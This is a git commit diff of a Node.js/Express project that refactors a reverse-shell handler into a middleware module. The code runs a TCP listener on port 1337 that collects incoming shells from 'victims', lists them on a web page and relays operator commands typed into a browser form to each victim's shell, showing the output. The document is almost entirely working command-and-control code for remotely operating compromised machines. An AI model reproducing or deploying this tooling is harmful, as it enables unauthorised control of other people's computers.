4e80398f53ffbc35c3218b16b3179a6e441ae46f
Victor Fresco <47251535+hacefresko@users.noreply.github.com>
2021-01-12 16:22:22 +0100

    Created middleware folder to organize code

--- index.js
+++ index.js
@@ -1,8 +1,7 @@
 var express = require('express');
 var bodyParser = require('body-parser');
 var nunjucks = require('nunjucks');
-var net = require('net');
-var date = require('./dateFormat');
+var TCPserver = require('./middleware/TCPMiddleware');
 
 var app = express();
 app.use(bodyParser.urlencoded({extended:true}));
@@ -11,129 +10,24 @@ nunjucks.configure('views', {
     express: app
 });
 
-/************************ TCP server **********************/
-
-var tcpPort = 1337;
-var victims = [];
-
-// Function passed as parameter is executed for every new connection
-net.createServer(function(sock) {
-    console.log('%s Victim %s connected', date.format(), sock.remoteAddress );
-
-    sock.commandLine = '';
-    sock.previousCommandLine = '';
-    sock.timesReloadedSuccesfully = 0;
-
-    // Event listener for receiving data
-    sock.on('data', function(data){
-        this.commandLine += data;
-        console.log('%s Victim %s responded:\n%s', date.format(), sock.remoteAddress, data);
-    })
-    // Event listeners for end of connection
-    sock.on('close', function() {
-        victims.splice(victims.indexOf(sock), 1);
-        console.log('%s Victim %s disconnected', date.format(), sock.remoteAddress);
-    });
-    sock.on('error', function (err){
-        victims.splice(victims.indexOf(sock), 1);
-        console.log('%s Victim %s disconnected because of error: %s', date.format(), remoteAddress, err.message);  
-    });
-
-    victims.push(sock);
-}).listen(tcpPort, '0.0.0.0');
-
-// Wrapper for waiting for the first response
-function waitForResponse(sock) {
-    return new Promise((resolve) => {           // Promise to resolve in the future
-        sock.once('data', function(data) {
-            resolve(true);
-        });
-        sock.once('close', function() {
-            resolve(false);
-        });
-        sock.once('error', function (err) {
-            resolve(false);
-        });
-    });
-}
-
-/******************* Web application server ********************/
-
-function checkVictim(req, res, next){
-    let i = 0, found = false, victim;
-
-    while (i < victims.length && !found){
-        if (victims[i].remoteAddress === req.params.ip){
-            victim = victims[i];
-            found = true;
-        }
-        i++;
-    }
-    req.victim = victim;
-    next();
-}
-
-app.get('/', function (req, res) {
-    if (victims.length == 0){
+app.get('/', TCPserver.getVictims, function (req, res) {
+    if (req.victims.length == 0){
         res.render('index.html');
     }
     else{
-        res.render('hub.html', { victims });
+        res.render('hub.html', { victims: req.victims });
     }
 })
 
-app.get('/:ip', checkVictim, function (req, res) {
-    let end = false;
-    let victim = req.victim;
-    
-    if (!victim){
-        res.redirect(303, '/');
-    }
-    else{
-        // If there is nothing new to display on commandLine, increment timesReloaldedSuccesfully, 
-        // else, reset the counter and reload the page (end = false). When the commandLine hasn't 
-        // been changed 5 times, stop reloading the page (end = true)
-        // This is done to get the largest number of responses when shell splits one response in many ones 
-        // (ie. PowerShell)
-        if (victim.previousCommandLine == victim.commandLine){
-            victim.timesReloadedSuccesfully++;
-        }
-        else{
-            victim.timesReloadedSuccesfully = 0;
-            victim.previousCommandLine = victim.commandLine;
-        }
-        if (victim.timesReloadedSuccesfully > 5){
-            end = true;
-        }
-        res.render('victim.html', { victim, end});
-    }
+app.get('/:ip', TCPserver.getCommandLine, function (req, res) {
+    res.render('victim.html', { victim: req.victim });
 })
 
-// Async so whole server doesn't freeze when waiting for the first response
-app.post('/:ip', checkVictim, async function (req, res) {
-    let victim = req.victim;
-
-    if (!victim){
-        res.redirect(303, '/');
-    }
-    else{
-        victim.timesReloadedSuccesfully = 0;
-        victim.commandLine += ' > ' + req.body.command + '\n';
-        victim.write(req.body.command + '\n');
-        console.log("%s User sent command: %s", date.format(), req.body.command);
-        await waitForResponse(victim);
-        res.render('victim.html', { victim, end: false});
-    }
+app.post('/:ip', TCPserver.send, function (req, res) {
+    res.render('victim.html', { victim: req.victim });
 })
 
-app.post('/:ip/disconnect', checkVictim, function(req, res){
-    let victim = req.victim;
-
-    if (victim){
-        victim.destroy();
-        console.log("%s Connection ended", date.format());
-    }
- 
+app.post('/:ip/disconnect', TCPserver.disconnect, function(req, res){ 
     res.redirect(303, '/');
 })
 
---
+++ middleware/TCPMiddleware.js
@@ -0,0 +1,129 @@
+var net = require('net');
+
+var tcpPort = 1337;
+var victims = [];
+
+// Function passed as parameter is executed for every new connection
+net.createServer(function(sock) {
+    console.log('Victim %s connected', sock.remoteAddress );
+
+    sock.commandLine = '';
+    sock.previousCommandLine = '';
+    sock.timesUnchanged = 0;
+
+    // Event listener for receiving data
+    sock.on('data', function(data){
+        this.commandLine += data;
+        console.log('Victim %s responded:\n%s', this.remoteAddress, data);
+    })
+    // Event listeners for end of connection
+    sock.on('close', function() {
+        victims.splice(victims.indexOf(this), 1);
+        console.log('Victim %s disconnected', this.remoteAddress);
+    });
+    sock.on('error', function (err){
+        victims.splice(victims.indexOf(this), 1);
+        console.log('Victim %s disconnected because of error: %s', this.remoteAddress, err.message);  
+    });
+
+    victims.push(sock);
+}).listen(tcpPort, '0.0.0.0');
+
+// Wrapper for waiting for the first response
+function waitForResponse(victim) {
+    // Promise to resolve in the future
+    return new Promise((resolve) => {
+        victim.once('data', function(data) {
+            resolve(true);
+        });
+        victim.once('close', function() {
+            resolve(false);
+        });
+        victim.once('error', function (err) {
+            resolve(false);
+        });
+    });
+}
+
+function getVictim(ip){
+    let i = 0, found = false;
+
+    if (ip){
+        while (i < victims.length && !found){
+            if (victims[i].remoteAddress === ip){
+                return victims[i];
+            }
+            i++;
+        }
+    }
+
+    return undefined;
+}
+
+module.exports = {
+    getVictims(req, res, next){
+        req.victims = victims;
+        next();
+    },
+
+    // Send command and waits for response (async so whole server doesn't freeze when waiting for the first response)
+    //     ip -> req.params.ip
+    //     command -> req.body.command
+    async send(req, res, next){
+        let victim = getVictim(req.params.ip);
+
+        if (!victim){
+            return res.redirect(303, '/');
+        }
+        victim.timesUnchanged = 0;
+        victim.commandLine += ' > ' + req.body.command + '\n';
+        victim.write(req.body.command + '\n');
+        console.log("User sent command: %s", req.body.command);
+        await waitForResponse(victim);
+        victim.end = false;
+
+        req.victim = victim;
+        next();
+    },
+
+    getCommandLine(req, res, next){
+        let victim = getVictim(req.params.ip);
+
+        if (!victim){
+            return res.redirect(303, '/');
+        }
+        // If there is nothing new to display on commandLine, increment timesUnchanged, 
+        // else, reset the counter and reload the page (end = false). When the commandLine hasn't 
+        // been changed 5 times, stop reloading the page (end = true)
+        // This is done to get the largest number of responses when shell splits one response in many ones 
+        // (ie. PowerShell)
+        if (victim.previousCommandLine == victim.commandLine){
+            victim.timesUnchanged++;
+        }
+        else{
+            victim.timesUnchanged = 0;
+            victim.previousCommandLine = victim.commandLine;
+        }
+        if (victim.timesUnchanged > 5){
+            victim.end = true;
+        }
+        else{
+            victim.end = false;
+        }
+
+        req.victim = victim;
+        next();
+    },
+
+    disconnect(req, res, next){
+        let victim = getVictim(req.params.ip);
+
+        if (!victim){
+            return res.redirect(303, '/');
+        }
+        victim.destroy();
+        console.log("Connection with %s ended", victim.remoteAddress);
+
+        next();
+    }
+}
